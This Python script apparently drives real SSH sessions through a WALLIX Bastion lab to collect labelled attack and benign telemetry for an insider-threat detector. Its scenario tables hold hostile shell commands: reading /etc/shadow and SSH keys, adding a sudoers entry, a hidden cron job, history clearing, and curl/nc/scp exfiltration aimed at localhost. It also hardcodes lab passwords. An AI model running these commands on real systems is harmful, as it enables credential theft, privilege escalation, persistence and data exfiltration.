#!/usr/bin/env python3
"""
simulate_sessions.py — drive real SSH sessions through the WALLIX Bastion
===========================================================================

Phase 1 of dataset generation (see claude.md §10): collect REAL template
sessions (6 attack types + benign) through the Bastion so extract.py can pull
them into events.jsonl/sessions.jsonl. These become templates.jsonl /
eval_real.jsonl inputs for generate_from_template.py — this script does not
do any synthesis itself.

WALLIX SSH login is two-password and interactive:
  paramiko auth (test-ssh / P@ssw@rd123) -> "Account successfully checked out"
  -> shell prompts "root's password:" -> typed into the channel (lab) -> shell.
sshpass/expect answer only one prompt each; paramiko's invoke_shell() lets us
watch the channel and answer the second prompt ourselves.

Every session is tagged: the first command is `echo TAG:<session_tag>` so the
tag shows up in KBD_INPUT telemetry and can be joined back to ground_truth.jsonl
after extract.py runs. All attack commands are self-cleaning / non-destructive
(create-then-delete, or read-only) — see claude.md §6 security note.

Usage
-----
  python simulate_sessions.py --list
  python simulate_sessions.py --attacks all --benign 10
  python simulate_sessions.py --attacks recon,privesc --benign 0
  python simulate_sessions.py --dry-run --attacks all --benign 3
"""

from __future__ import annotations

import argparse
import json
import os
import random
import re
import sys
import time
import uuid
from datetime import datetime, timezone
from typing import List, Optional

try:
    import paramiko
except ImportError:
    print("[simulate] missing dependency: pip install paramiko", file=sys.stderr)
    raise

# ─────────────────────────── lab configuration ──────────────────────────────
BASTION_HOST   = os.environ.get("WALLIX_HOST", "192.168.1.50")
BASTION_PORT   = int(os.environ.get("WALLIX_SSH_PORT", "22"))
LOGIN_USER     = os.environ.get("WALLIX_LOGIN_USER", "test-ssh")
LOGIN_PASS     = os.environ.get("WALLIX_LOGIN_PASS", "P@ssw@rd123.")
TARGET_PASS    = os.environ.get("WALLIX_TARGET_PASS", "lab")
TARGET_HOST    = "debian-lab"

# Prompt matcher tolerates trailing whitespace after the prompt glyph; ANSI
# colour/escape codes are stripped from the buffer before matching (see
# _read_until_any / ANSI_RE), so a coloured PS1 no longer defeats it -- that
# brittleness was a common cause of spurious 15s timeouts on a finished command.
PROMPT_RE   = re.compile(r"[#$>]\s*$")
PASSWORD_RE = re.compile(r"password:\s*$", re.IGNORECASE)
MENU_READY_RE = re.compile(r"ctrl-D to quit", re.IGNORECASE)
MENU_ROW_RE = re.compile(r"\|\s*(\d+)\s*\|\s*([\w.\-]+)@")
# A mid-command "password for X:" is sudo asking us for a password we don't
# have on the non-root persona accounts. That denial is itself a real
# insider-threat signal (failed privesc attempt), not a script failure --
# see run_session, which cancels it with Ctrl+C and keeps going.
SUDO_DENIED_RE = re.compile(r"password for [^:]+:\s*$", re.IGNORECASE)
# Strip terminal escape sequences before prompt-matching (coloured PS1, cursor
# moves, etc.). Without this a prompt like "\x1b[01;32mroot@host\x1b[0m# " never
# matches PROMPT_RE and the step times out even though the command finished.
ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[ -/]*[@-~]")

# Per-step timeout (waiting for one prompt). Env-tunable; default raised from 15
# to 30 because network commands (scp/curl/nc with their own timeouts, find) and
# a slow account checkout legitimately exceed 15s. CONNECT_TIMEOUT covers the
# slower login+menu-checkout phase.
STEP_TIMEOUT = int(os.environ.get("WALLIX_STEP_TIMEOUT", "30"))
CONNECT_TIMEOUT = int(os.environ.get("WALLIX_CONNECT_TIMEOUT", "45"))
# Transient test-ssh lockout / rate-limiting after back-to-back logins is the
# main cause of empty-buffer connect failures (CLAUDE.md 3.8). Retry the connect
# a few times with growing backoff instead of failing the session outright.
CONNECT_RETRIES = int(os.environ.get("WALLIX_CONNECT_RETRIES", "3"))
CONNECT_BACKOFF = float(os.environ.get("WALLIX_CONNECT_BACKOFF", "5"))  # seconds, doubled each try

# Real vaulted accounts on debian-lab, as offered by the WALLIX selection menu.
# THIS LIST IS WALLIX CONFIGURATION AND IT MOVES. Observed 2026-08-15:
#   p_admin, p_audit, p_dba, p_dev, svc-debian
# `bastionsvc` no longer exists -- the admin persona now maps to svc-debian.
# Note the semantic change: bastionsvc was a plain non-sudo account, svc-debian
# is root. The admin persona's benign commands are unchanged, but its account is
# now privileged, so `account` is a weaker role signal than it was. Worth
# re-checking whenever the menu changes; _select_account already fails loudly
# with the menu it actually saw rather than hanging.
#
# Personas get their own real account (genuine per-persona command
# distributions, real role_command_mismatch signal). Attack scenarios default to
# p_admin but can rotate through the sudoer accounts (--attack-accounts) --
# that's the actual insider-threat signal: a normal-role account doing
# privileged things it shouldn't.
PERSONA_ACCOUNTS = {"admin": "svc-debian", "dba": "p_dba", "dev": "p_dev", "auditor": "p_audit"}
ATTACK_ACCOUNT = "p_admin"
ATTACK_CAPABLE_ACCOUNTS = ["p_admin", "p_dev", "p_dba", "p_audit"]

GROUND_TRUTH_PATH = os.path.join(os.path.dirname(__file__), "out", "ground_truth.jsonl")

# Curated external content (see curate_linux_commands.py / curate_atomic_redteam.py).
# Benign: mecha-org/linux-command-dataset, pre-filtered to exclude anything matching
# a wallix_rules.xml pattern. Attack: Atomic Red Team, pre-filtered for self-cleaning/
# non-destructive/no-TTY-hang -- still only 16 candidates survived across all 6
# scenarios (privesc/cred_access/exfil yielded none; ART assumes disposable VMs, not
# a shared lab -- see curate_atomic_redteam.py docstring). Both are optional: falls
# back to the hand-built defaults below if the curated files aren't present.
# NOTE: the curated corpora moved to dataset_generation/commands_dataset/ in the
# 2026-08-03 restructure. This path was not updated, and because _load_json fell
# back SILENTLY, every session collected since then drew from the 4-6 hand-built
# core commands alone -- no curated benign vocabulary, no Atomic Red Team attack
# variants. That is a large part of why the first batch was so repetitive.
# _load_json now warns instead of failing quietly.
_COMMANDS_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                             "dataset_generation", "commands_dataset")


def _load_json(path: str) -> dict:
    if not os.path.isfile(path):
        print(f"[simulate] WARNING: curated corpus not found: {path} "
              f"-- falling back to the built-in core commands only", file=sys.stderr)
        return {}
    with open(path, encoding="utf-8") as fh:
        return json.load(fh)


# ─────────────────────── benign-corpus safety filter ────────────────────────
# The rule lives in dataset_generation/command_safety.py because BOTH the
# collector (safety: this filler really executes as root) and the generator
# (parity: both benign vocabularies must be drawn from the same population) need
# exactly the same definition. See that module's docstring for why.
sys.path.insert(0, os.path.dirname(_COMMANDS_DIR))
from command_safety import is_safe_benign, filter_corpus   # noqa: E402


BENIGN_CURATED = filter_corpus(
    _load_json(os.path.join(_COMMANDS_DIR, "persona_commands_curated.json")),
    label="simulate")
_ATTACK_CURATED_RAW = _load_json(os.path.join(_COMMANDS_DIR, "attack_commands_curated.json"))

# ─────────────────────────── scenario library ───────────────────────────────
# Rule IDs from claude.md §5. Every attack scenario is read-only or
# create-then-delete; exfil targets 127.0.0.1 so nothing leaves the lab.
ATTACK_SCENARIOS = {
    "recon": {
        "rule_ids": [100518],
        "mitre": ["T1082", "T1087"],
        "commands": [
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "cat /etc/os-release",
            "ps aux",
            "netstat -tulnp",
            "who",
            "last -n 5",
        ],
    },
    "cred_access": {
        "rule_ids": [100510],
        "mitre": ["T1003", "T1552"],
        "commands": [
            "{sudo}cat /etc/shadow",
            "{sudo}find /root /home /etc -name id_rsa 2>/dev/null",
            "cat ~/.ssh/authorized_keys 2>/dev/null",
            "find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null",
        ],
    },
    "privesc": {
        "rule_ids": [100512],
        "mitre": ["T1548", "T1136"],
        "commands": [
            "sudo -l",
            "{sudo}useradd -m tempuser_{tag}",
            "echo 'tempuser_{tag} ALL=(ALL) NOPASSWD:ALL' | {sudo}tee /etc/sudoers.d/tempuser_{tag} > /dev/null",
            "id tempuser_{tag}",
            "{sudo}rm -f /etc/sudoers.d/tempuser_{tag}",
            "{sudo}userdel -r tempuser_{tag}",
        ],
    },
    "persistence": {
        "rule_ids": [100514],
        "mitre": ["T1053", "T1098"],
        "commands": [
            "echo '#!/bin/bash' > /tmp/.cache_update_{tag}.sh",
            "(crontab -l 2>/dev/null; echo \"*/5 * * * * /tmp/.cache_update_{tag}.sh\") | crontab -",
            "crontab -l",
            "crontab -l | grep -v {tag} | crontab -",
            "rm -f /tmp/.cache_update_{tag}.sh",
        ],
    },
    "log_tamper": {
        "rule_ids": [100516],
        "mitre": ["T1070", "T1562"],
        "commands": [
            "{sudo}ls -la /var/log/",
            "{sudo}cat /var/log/auth.log 2>/dev/null | tail -20",
            "history -c",
            "last",
        ],
    },
    "exfil": {
        "rule_ids": [100520],
        "mitre": ["T1048", "T1041"],
        "commands": [
            "echo 'test-data-{tag}' > /tmp/exfil_test_{tag}.txt",
            "scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 "
            "/tmp/exfil_test_{tag}.txt root@127.0.0.1:/tmp/ 2>&1 | head -5",
            "curl -s -m 3 -X POST -F file=@/tmp/exfil_test_{tag}.txt http://127.0.0.1:9999/upload 2>&1 | head -3",
            "nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_{tag}.txt 2>&1",
            "rm -f /tmp/exfil_test_{tag}.txt",
        ],
    },
}

# Atomic Red Team variants per scenario, built from attack_commands_curated.json.
# Each variant is an alternative command list to the hand-built default above --
# picked randomly per session (see get_attack_commands) so repeated reps of the
# same scenario aren't always byte-identical. Multi-line command/cleanup blocks
# are split into individual lines (each is a complete, self-contained shell
# statement -- verified by inspection, no heredocs/multi-line control blocks)
# and typed one at a time, same as the hand-built commands.
ATTACK_VARIANTS: dict = {}
for _scenario, _tests in _ATTACK_CURATED_RAW.items():
    for _t in _tests:
        _lines = [l for l in _t["command"].splitlines() if l.strip()]
        if _t.get("cleanup_command"):
            _lines += [l for l in _t["cleanup_command"].splitlines() if l.strip()]
        ATTACK_VARIANTS.setdefault(_scenario, []).append({
            "technique": _t["technique"],
            "test_name": _t["test_name"],
            "commands": _lines,
        })

# Persona-based benign command pools (claude.md §10 personas: admin/dba/dev/auditor).
# This hand-built list is a small guaranteed CORE per persona (always included,
# read-only, known to run cleanly on debian-lab) -- see get_benign_commands()
# below for how it's combined with BENIGN_CURATED for per-session diversity.
BENIGN_PERSONAS_CORE = {
    "admin": [
        "ls -la", "df -h", "systemctl --no-pager status sshd", "uptime", "free -m", "who",
    ],
    "dba": [
        "ls -la /var/lib", "du -sh /var/log", "ps aux | grep -i sql", "cat /etc/hosts",
    ],
    "dev": [
        "cd /tmp && ls -la", "git status", "cat /etc/os-release", "python3 --version",
    ],
    "auditor": [
        "cat /etc/passwd", "ls -la /etc/", "w", "last -n 10", "uptime",
    ],
}
BENIGN_PERSONAS = BENIGN_PERSONAS_CORE  # back-compat alias (e.g. --list, persona name set)


def get_benign_commands(persona: str, extra: int = 4) -> list:
    """Core commands (always included) + up to `extra` random commands sampled
    from the curated public dataset (empty extra pool -> core only).

    Fixed-length, all-distinct: kept for --no-vary / back-compat. compose_benign()
    is what a normal run uses -- see the SESSION COMPOSITION block below."""
    core = list(BENIGN_PERSONAS_CORE[persona])
    pool = BENIGN_CURATED.get(persona, [])
    if pool:
        core += random.sample(pool, min(extra, len(pool)))
    return core


# ─────────────────────── session composition ────────────────────────────────
# Two defects were MEASURED in the first collected batch (ml/unsupervised/train.py),
# and both are properties of how this script composed sessions, not of the lab:
#
#   1. unique_command_ratio == 1.00 in every real session, because a session was
#      a fixed list of distinct commands run once. Real users repeat themselves.
#      The domain gate consequently rejected unique_command_ratio (KS 0.94) and
#      command_entropy (KS 0.69) -- a model trained on generated benign would
#      have flagged every real session for being real.
#
#   2. An attack session was 100% attack commands, so avg_command_length alone
#      scored AUC 0.832 on the eval set: the detector was reading "long command",
#      not behaviour. Real insider activity is a handful of malicious commands
#      inside an otherwise ordinary session.
#
# So sessions are now COMPOSED rather than replayed:
#
#   benign   variable length, sampled with repetition (--stickiness)
#   attack   one of three compositions, chosen per session (--bury-rate):
#              full      the scenario alone, as before -- the loud end of the
#                        intensity gradient, kept so it stays represented
#              diluted   the whole scenario, benign filler interleaved between
#                        its commands (relative order preserved, so every
#                        create-then-delete pair still cleans up)
#              minimal   1-2 read-only attack commands buried in a benign session
#
# SAFETY: `minimal` draws only from BURIABLE, which is read-only by construction
# -- no command there creates state, so a session that never reaches a cleanup
# step cannot leave anything behind on the target. Multi-step scenarios that DO
# create state are only ever run whole (full/diluted).

# Read-only commands that still carry their tactic, safe to run standalone.
BURIABLE = {
    "recon": ["whoami", "id", "uname -a", "netstat -tulnp", "last -n 5", "ps aux"],
    "cred_access": [
        "{sudo}cat /etc/shadow",
        "cat ~/.ssh/authorized_keys 2>/dev/null",
        "{sudo}find /root /home /etc -name id_rsa 2>/dev/null",
        "find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null",
    ],
    "privesc": ["sudo -l", "{sudo}cat /etc/sudoers",
                "find /usr/bin -perm -4000 -type f 2>/dev/null"],
    "persistence": ["crontab -l", "{sudo}ls -la /etc/cron.d/", "{sudo}cat /etc/crontab"],
    "log_tamper": ["history -c", "{sudo}ls -la /var/log/", "last"],
    "exfil": [
        "curl -s -m 3 -X POST -F file=@/etc/hostname http://127.0.0.1:9999/upload 2>&1 | head -3",
        "nc -w 2 127.0.0.1 9999 < /etc/hostname 2>&1",
    ],
}

# Which persona's routine an attacker's session looks like. p_admin has no
# persona of its own; admin traffic is the closest cover.
ACCOUNT_PERSONA = {"p_dev": "dev", "p_dba": "dba", "p_audit": "auditor",
                   "svc-debian": "admin", "bastionsvc": "admin",
                   "p_admin": "admin"}


def sample_filler(persona: str, n: int, stickiness: float) -> list:
    """n benign commands drawn WITH repetition. stickiness = P(re-issue something
    already typed this session) -- the knob that stops unique_command_ratio
    pinning at 1.0. Mirrors generate_benign.py so both sides of the dataset are
    repetitive in the same way."""
    pool = list(BENIGN_PERSONAS_CORE[persona]) + list(BENIGN_CURATED.get(persona, []))
    issued: list = []
    for _ in range(max(0, n)):
        if issued and random.random() < stickiness:
            issued.append(random.choice(issued))
        else:
            issued.append(random.choice(pool))
    return issued


def interleave(attack: list, filler: list) -> list:
    """Merge two lists at random while preserving the order WITHIN each. Attack
    steps therefore keep their sequence -- create still precedes its cleanup."""
    a, f, out = list(attack), list(filler), []
    while a or f:
        if not a:
            out.append(f.pop(0))
        elif not f:
            out.append(a.pop(0))
        elif random.random() < len(a) / (len(a) + len(f)):
            out.append(a.pop(0))
        else:
            out.append(f.pop(0))
    return out


def compose_benign(persona: str, stickiness: float, length_range: tuple) -> list:
    """A benign session of random length, with repeats. The persona's core
    commands stay likely (they are in the pool) but are no longer guaranteed --
    a fixed prefix in every session is itself a giveaway."""
    return sample_filler(persona, random.randint(*length_range), stickiness)


def compose_attack(scenario: str, commands: list, persona: str, bury_rate: float,
                   stickiness: float, length_range: tuple) -> tuple:
    """Returns (commands, composition_label). See the block comment above."""
    if random.random() >= bury_rate:
        return commands, "full"

    buriable = BURIABLE.get(scenario)
    if buriable and random.random() < 0.5:
        picked = random.sample(buriable, min(random.randint(1, 2), len(buriable)))
        filler = sample_filler(persona, random.randint(*length_range), stickiness)
        return interleave(picked, filler), "minimal"

    # Dilute: keep the scenario whole (cleanup intact), pad around it.
    filler = sample_filler(persona, max(2, len(commands)), stickiness)
    return interleave(commands, filler), "diluted"


def get_attack_commands(scenario: str) -> tuple:
    """Randomly picks between the hand-built default and an available Atomic
    Red Team variant for this scenario. Returns (commands, variant_label)."""
    variants = ATTACK_VARIANTS.get(scenario, [])
    if variants and random.random() < 0.5:
        v = random.choice(variants)
        return v["commands"], f"art:{v['technique']}:{v['test_name']}"
    return list(ATTACK_SCENARIOS[scenario]["commands"]), "default"


# ─────────────────────────── SSH driver ─────────────────────────────────────
class SessionError(RuntimeError):
    pass


def _read_until(channel, pattern: re.Pattern, timeout: int = STEP_TIMEOUT) -> str:
    """Accumulate channel output until `pattern` matches the tail, or time out."""
    buf, _ = _read_until_any(channel, [pattern], timeout)
    return buf


def _read_until_any(channel, patterns: List[re.Pattern],
                     timeout: int = STEP_TIMEOUT) -> tuple:
    """Accumulate channel output until any pattern matches, or time out.
    Returns (buffer, index of the pattern that matched)."""
    buf = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        if channel.recv_ready():
            chunk = channel.recv(4096).decode("utf-8", errors="replace")
            buf += chunk
            # Match against an ANSI-stripped view so a coloured prompt still hits.
            clean = ANSI_RE.sub("", buf)
            for i, pattern in enumerate(patterns):
                if pattern.search(clean):
                    return clean, i
        else:
            time.sleep(0.1)
    pat_desc = " | ".join(p.pattern for p in patterns)
    raise SessionError(f"timed out waiting for [{pat_desc}]; buffer so far:\n{buf}")


def _send(channel, line: str) -> None:
    channel.send(line + "\n")


# The WALLIX prompt shown after the target shell exits, before the transport
# drops. Reaching it means the session tore down cleanly (so SESSION_DISCONNECTION
# is logged for our session_id).
SELECTOR_RE = re.compile(r"back to selector|ctrl-D to quit", re.IGNORECASE)


def _drain_until_closed(channel, timeout: int = STEP_TIMEOUT) -> None:
    """After `exit`, read until the channel reports EOF or WALLIX shows the
    selector -- i.e. the session has actually closed. Returns quietly on timeout;
    a graceful close is best-effort, not worth failing an otherwise-good session."""
    deadline = time.time() + timeout
    buf = ""
    while time.time() < deadline:
        if channel.exit_status_ready() or channel.closed:
            return
        if channel.recv_ready():
            chunk = channel.recv(4096).decode("utf-8", errors="replace")
            if not chunk:            # EOF
                return
            buf += chunk
            if SELECTOR_RE.search(ANSI_RE.sub("", buf)):
                # Session closed back to the WALLIX selector; give WALLIX a beat
                # to emit the SESSION_DISCONNECTION log line, then we're done.
                time.sleep(1.0)
                return
        else:
            time.sleep(0.1)


def _select_account(channel, account: str, timeout: int = CONNECT_TIMEOUT) -> None:
    """Parse the WALLIX account-selection menu and pick the row matching `account`."""
    buf = _read_until(channel, MENU_READY_RE, timeout=timeout)
    by_name = {name: idx for idx, name in MENU_ROW_RE.findall(buf)}  # account name -> row id
    if account not in by_name:
        raise SessionError(f"account {account!r} not found in WALLIX menu; saw: {by_name}")
    _send(channel, by_name[account])


def _open_session(account: str, session_tag: str, verbose: bool = False):
    """Connect, pick the account, clear the optional 2nd-password prompt, and send
    the TAG marker. Retries the whole login on transient failures (test-ssh
    lockout / rate-limiting after back-to-back sessions -- CLAUDE.md 3.8), with
    growing backoff. Returns (client, channel) ready for the command loop."""
    last_err = None
    for attempt in range(1, CONNECT_RETRIES + 1):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(BASTION_HOST, port=BASTION_PORT, username=LOGIN_USER,
                           password=LOGIN_PASS, look_for_keys=False, allow_agent=False,
                           timeout=CONNECT_TIMEOUT)
            channel = client.invoke_shell()
            # Account-selection menu (table of ID | Site | Authorization); pick by ID.
            _select_account(channel, account)
            # Some vaulted accounts prompt for a second password, others connect
            # straight to a shell -- WALLIX config, not predictable here. Detect it.
            _, matched = _read_until_any(channel, [PASSWORD_RE, PROMPT_RE],
                                         timeout=CONNECT_TIMEOUT)
            if matched == 0:
                _send(channel, TARGET_PASS)
                _read_until(channel, PROMPT_RE, timeout=CONNECT_TIMEOUT)
            _send(channel, f"echo TAG:{session_tag}")
            _read_until(channel, PROMPT_RE)
            return client, channel
        except (SessionError, paramiko.SSHException, OSError) as e:
            client.close()
            last_err = e
            if attempt < CONNECT_RETRIES:
                wait = CONNECT_BACKOFF * (2 ** (attempt - 1))
                if verbose:
                    print(f"       (connect attempt {attempt} failed: {e}; "
                          f"retrying in {wait:.0f}s)", file=sys.stderr)
                time.sleep(wait)
    raise SessionError(f"connect failed after {CONNECT_RETRIES} attempts: {last_err}")


def run_session(scenario_name: str, commands: List[str], session_tag: str, account: str,
                 pacing: tuple = (0.4, 1.3), dry_run: bool = False,
                 verbose: bool = False) -> None:
    # p_admin is already root; sudo would be redundant (but harmless). Every
    # other account is a NOPASSWD sudoer, so "sudo " unlocks the same
    # root-only steps (reading /etc/shadow, useradd, sudoers, auth.log).
    sudo_prefix = "" if account == ATTACK_ACCOUNT else "sudo "
    # Literal replace, not str.format(): curated content (ART/public dataset)
    # isn't guaranteed free of stray { } (e.g. shell brace expansion), which
    # would otherwise raise inside .format().
    resolved = [c.replace("{tag}", session_tag).replace("{sudo}", sudo_prefix)
                for c in commands]

    if dry_run:
        print(f"[dry-run] {scenario_name} tag={session_tag} account={account}")
        for c in resolved:
            print(f"    {c}")
        return {"commands_sent": resolved, "commands_denied": []}

    # Connect + account select + TAG marker, with retry/backoff on transient
    # lockout. Raises SessionError if all attempts fail (caught by the caller).
    client, channel = _open_session(account, session_tag, verbose=verbose)
    try:
        denied = []
        for cmd in resolved:
            if verbose:
                print(f"    -> {cmd}")
            _send(channel, cmd)
            time.sleep(random.uniform(*pacing))
            _, idx = _read_until_any(channel, [PROMPT_RE, SUDO_DENIED_RE])
            if idx == 1:
                # No password for this account -- cancel the prompt and move on.
                # The denial itself is real telemetry (failed privesc attempt).
                if verbose:
                    print(f"       (denied: no password for {account})")
                denied.append(cmd)
                channel.send("\x03")
                _read_until(channel, PROMPT_RE)

        # Close GRACEFULLY. Sending `exit` then force-closing the transport too
        # fast makes WALLIX log only the proxy-level `[sshproxy] DISCONNECTION`
        # (psid, not joinable) and skip the rich `[SSH Session] SESSION_DISCONNECTION`
        # (session_id + duration) that extract needs to mark the session closed.
        # So after `exit`, drain the channel until the session actually ends
        # (EOF, or WALLIX's "back to selector" prompt) before closing -- this is
        # what lets the session-close event fire for our session_id.
        _send(channel, "exit")
        _drain_until_closed(channel, timeout=STEP_TIMEOUT)
        return {"commands_sent": resolved, "commands_denied": denied}
    finally:
        client.close()


# ─────────────────────────── ground truth ───────────────────────────────────
def append_ground_truth(record: dict) -> None:
    os.makedirs(os.path.dirname(GROUND_TRUTH_PATH), exist_ok=True)
    with open(GROUND_TRUTH_PATH, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(record, ensure_ascii=False) + "\n")


def make_tag(kind: str, name: str) -> str:
    # kept short: it gets embedded in usernames/filenames on the target
    # (useradd caps at 32 chars), e.g. "atk_privesc_a3f9c1"
    kind_code = "atk" if kind == "attack" else "ben"
    return f"{kind_code}_{name}_{uuid.uuid4().hex[:6]}"


# ─────────────────────────── main ───────────────────────────────────────────
def main(argv: Optional[List[str]] = None) -> int:
    p = argparse.ArgumentParser(description="Drive real SSH sessions through WALLIX for dataset templates")
    p.add_argument("--attacks", default="all",
                    help="comma-separated attack scenario names, or 'all' or 'none' "
                         f"(available: {','.join(ATTACK_SCENARIOS)})")
    p.add_argument("--benign", type=int, default=10, help="number of benign sessions to run")
    p.add_argument("--repeat", type=int, default=1, help="repeat each attack scenario N times")
    p.add_argument("--attack-accounts", default="p_admin",
                    help="comma-separated accounts to rotate attack sessions through "
                         f"(available: {','.join(ATTACK_CAPABLE_ACCOUNTS)}). Accounts other "
                         "than p_admin are NOPASSWD sudoers -- root-only steps get a 'sudo ' "
                         "prefix automatically. This is the real insider-threat signal: a "
                         "normal-role account doing privileged things it shouldn't.")
    p.add_argument("--stickiness", type=float, default=0.30,
                    help="P(a command re-uses one already issued this session). "
                         "0 reproduces the old all-distinct sessions, which is what "
                         "pinned unique_command_ratio at 1.0 in the first batch.")
    p.add_argument("--bury-rate", type=float, default=0.70,
                    help="fraction of attack sessions hidden inside benign activity "
                         "(diluted or minimal); the rest run the scenario alone")
    p.add_argument("--benign-length", default="4,14",
                    help="min,max commands per benign session")
    p.add_argument("--no-vary", action="store_true",
                    help="disable composition entirely: fixed all-distinct sessions, "
                         "attacks always 'full' (the pre-2026-08-07 behaviour)")
    p.add_argument("--dry-run", action="store_true", help="print commands, don't connect")
    p.add_argument("--verbose", action="store_true", help="print each command as it's sent")
    p.add_argument("--list", action="store_true", help="list scenarios and exit")
    args = p.parse_args(argv)

    if args.list:
        print("Attack scenarios:")
        for name, spec in ATTACK_SCENARIOS.items():
            print(f"  {name:12s} rule_ids={spec['rule_ids']} mitre={spec['mitre']}")
        print("Benign personas:", ", ".join(BENIGN_PERSONAS))
        return 0

    if args.attacks == "all":
        attack_names = list(ATTACK_SCENARIOS)
    elif args.attacks == "none":
        attack_names = []
    else:
        attack_names = [a.strip() for a in args.attacks.split(",") if a.strip()]
        unknown = set(attack_names) - set(ATTACK_SCENARIOS)
        if unknown:
            print(f"[simulate] unknown scenario(s): {unknown}", file=sys.stderr)
            return 1

    attack_accounts = [a.strip() for a in args.attack_accounts.split(",") if a.strip()]
    unknown_acc = set(attack_accounts) - set(ATTACK_CAPABLE_ACCOUNTS)
    if unknown_acc:
        print(f"[simulate] unknown attack account(s): {unknown_acc} "
              f"(available: {ATTACK_CAPABLE_ACCOUNTS})", file=sys.stderr)
        return 1

    try:
        lo, hi = (int(x) for x in args.benign_length.split(","))
        benign_length = (lo, hi) if lo <= hi else (hi, lo)
    except ValueError:
        print(f"[simulate] --benign-length wants 'min,max', got {args.benign_length!r}",
              file=sys.stderr)
        return 1

    plan = []
    acc_i = 0
    for name in attack_names:
        for _ in range(args.repeat):
            plan.append(("attack", name, attack_accounts[acc_i % len(attack_accounts)]))
            acc_i += 1
    personas = list(BENIGN_PERSONAS)
    for i in range(args.benign):
        persona = personas[i % len(personas)]
        plan.append(("benign", persona, PERSONA_ACCOUNTS[persona]))
    random.shuffle(plan)

    print(f"[simulate] plan: {len(plan)} sessions "
          f"({len(attack_names)} attack types x{args.repeat} across {attack_accounts}, "
          f"{args.benign} benign)", file=sys.stderr)

    for kind, name, account in plan:
        tag = make_tag(kind, name)
        started = datetime.now(timezone.utc).isoformat()

        if kind == "attack":
            spec = ATTACK_SCENARIOS[name]
            commands, variant = get_attack_commands(name)
            rule_ids = spec["rule_ids"]
            mitre = spec["mitre"]
            attack_len = len(commands)
            if args.no_vary:
                composition = "full"
            else:
                commands, composition = compose_attack(
                    name, commands, ACCOUNT_PERSONA.get(account, "admin"),
                    args.bury_rate, args.stickiness, benign_length)
                if composition == "minimal":
                    # a minimal burial replaces the scenario with 1-2 of its
                    # read-only commands, so the count changes
                    attack_len = sum(1 for c in commands if c in
                                     [b for b in BURIABLE.get(name, [])])
        else:
            spec = None
            composition = "fixed" if args.no_vary else "sampled"
            commands = (get_benign_commands(name) if args.no_vary
                        else compose_benign(name, args.stickiness, benign_length))
            variant = "core+curated"
            rule_ids = []
            mitre = []
            attack_len = 0

        print(f"[simulate] running {kind}:{name} tag={tag} account={account}", file=sys.stderr)
        commands_denied: List[str] = []
        commands_sent: List[str] = []
        try:
            result = run_session(name, commands, tag, account,
                                  dry_run=args.dry_run, verbose=args.verbose)
            if result:
                commands_sent = result["commands_sent"]
                commands_denied = result["commands_denied"]
            status = "ok"
            error = None
        except (SessionError, paramiko.SSHException, OSError) as e:
            # Includes paramiko auth/connect failures (e.g. a transient auth
            # blip or lockout) -- one bad session shouldn't kill the whole batch.
            status = "error"
            error = str(e)
            print(f"[simulate] session {tag} FAILED: {e}", file=sys.stderr)

        if not args.dry_run:
            fail_ratio = (len(commands_denied) / len(commands_sent)) if commands_sent else 0.0
            append_ground_truth({
                "session_tag": tag,
                "kind": kind,               # "attack" | "benign"
                "scenario": name,           # attack type or persona
                "variant": variant,         # "default" | "art:<technique>:<test_name>" | "core+curated"
                # How the session was composed. Needed at eval time: a detector
                # that only catches composition="full" has caught the loud case
                # and missed the realistic one, and the report has to separate
                # those two recalls rather than average them away.
                "composition": composition,     # full | diluted | minimal | sampled | fixed
                "attack_command_count": attack_len,
                "total_command_count": len(commands),
                "stickiness": args.stickiness,
                "expected_rule_ids": rule_ids,
                "mitre": mitre,
                "target_hostname": TARGET_HOST,
                "account": account,
                "protocol": "SSH",
                "started_at": started,
                "status": status,
                "error": error,
                "commands_denied": commands_denied,  # sudo-denied on this account (no password)
                "fail_ratio": round(fail_ratio, 3),
            })

        if not args.dry_run:
            # Space out logins: back-to-back checkouts are what trip test-ssh
            # lockout/rate-limiting mid-batch. Env-tunable via WALLIX_SESSION_GAP.
            gap = float(os.environ.get("WALLIX_SESSION_GAP", "4"))
            time.sleep(random.uniform(gap, gap * 1.75))

    if not args.dry_run:
        print(f"[simulate] ground truth -> {GROUND_TRUTH_PATH}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
